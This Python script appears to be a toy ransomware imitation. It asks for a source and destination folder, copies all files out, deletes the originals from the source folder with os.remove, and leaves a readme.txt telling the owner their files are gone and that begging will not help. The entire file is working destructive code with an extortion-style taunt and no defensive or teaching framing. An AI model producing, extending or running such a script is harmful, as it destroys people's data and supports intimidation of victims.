import os
import shutil

#copying file to another directory
def copy_file(source_dir,destination_dir):
    os.makedirs(destination_dir,exist_ok=True)
    for filename in os.listdir(source_dir):
        source_file = os.path.join(source_dir,filename)
        destination_file = os.path.join(destination_dir,filename)

        if os.path.isfile(source_file):
            shutil.copy2(source_file,destination_file)

#creating readme file 
def readme(source_dir):
    file_path = os.path.join(source_dir,"readme.txt")
    with open(file_path,"w") as file:
        file.write("Bro your all files are removed\n you can beg me but you will not get it anyway")

#removing the files from source directory
def delete(source_dir):
    files = os.listdir(source_dir)
    for filename in files:
        file_path = os.path.join(source_dir,filename)
        try:
            os.remove(file_path)
        except FileNotFoundError:
            print(f"{file_path} not found in the directory")
        except PermissionError:
            print(f"you dont have permisson to file {file_path}")
        except Exception as e:
            print(f"An error occured {e}")

source_dir = input("Enter the path to the source directory: ")
destination_dir = input("Enter the path to the destination directory: ")
copy_file(source_dir,destination_dir)
delete(source_dir)
readme(source_dir)
